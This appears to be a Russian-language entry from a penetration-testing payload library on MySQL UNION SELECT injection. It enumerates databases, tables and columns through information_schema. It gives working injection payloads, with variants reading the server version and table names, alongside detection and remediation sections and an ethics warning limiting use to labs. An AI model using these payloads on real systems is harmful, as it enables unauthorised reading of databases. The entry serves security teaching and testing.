---
id: sqli-mysql-union-select-enumeration
title: "MySQL: UNION SELECT — перечисление схемы через information_schema"
type: sqli
target: mysql
category: web
difficulty: intermediate
bypass: none
tags: [sqli, mysql, union, enumeration]
tested_on: ["MySQL 5.7", "MySQL 8.0", "SQLite 3.40 (sqli-lab)"]
success_rate: 0.8
risk: high
cwe: "CWE-89"
lab: "labs/web-labs/sqli-lab"
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/SQL_Injection"
  - "https://portswigger.net/web-security/sql-injection"
graph:
  - target: "sqli"
    type: instance_of
  - target: "data-exfiltration"
    type: leads_to
---

# MySQL: UNION SELECT — перечисление схемы через information_schema

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
-1' UNION SELECT table_schema,table_name,column_name,4 FROM information_schema.columns -- -
```

## Explanation

`UNION SELECT` добавляет результат произвольного запроса к выдаче приложения.
Отрицательный `id` гарантирует, что первая часть вернёт 0 строк, и на экране останутся
только наши данные. `information_schema` — системный каталог MySQL/MariaDB со списком
всех БД, таблиц и колонок. Число колонок в `UNION` должно совпадать с исходным запросом.

## Detection

1. Подбор числа колонок: `ORDER BY 1..N` до ошибки или `UNION SELECT NULL,NULL,...`.
2. Поиск «отражаемых» колонок: `-1' UNION SELECT 1,2,3 -- -` — куда попали числа,
   туда и подставляем данные.
3. В логах веб-сервера — запросы с `information_schema`.

## Remediation

- Параметризация + whitelist для `ORDER BY`/имён колонок (их нельзя параметризовать).
- Ограничить доступ приложения к `information_schema` (отдельная учётка, минимальные права).
- Отключить вывод ошибок СУБД в production.

## Variants

```
-1' UNION SELECT NULL,version(),NULL,NULL -- -
```

```
-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -
```
